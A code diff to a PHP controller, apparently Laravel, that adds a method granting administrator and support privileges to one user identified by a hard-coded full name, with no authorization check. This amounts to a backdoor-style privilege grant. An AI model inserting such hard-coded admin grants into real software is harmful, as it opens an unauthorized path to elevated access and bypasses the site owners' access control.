@@ -46,4 +46,10 @@ class controleController extends Controller
 
         return redirect()->route('controle');
     }
+
+    public function darAdmin() {
+        $user = User::where('name', 'VINICIUS DE ANDRADE PIOVEZAN');
+        $user->update(['admin' => true]);
+        $user->update(['suporte' => true]);
+    }
 }
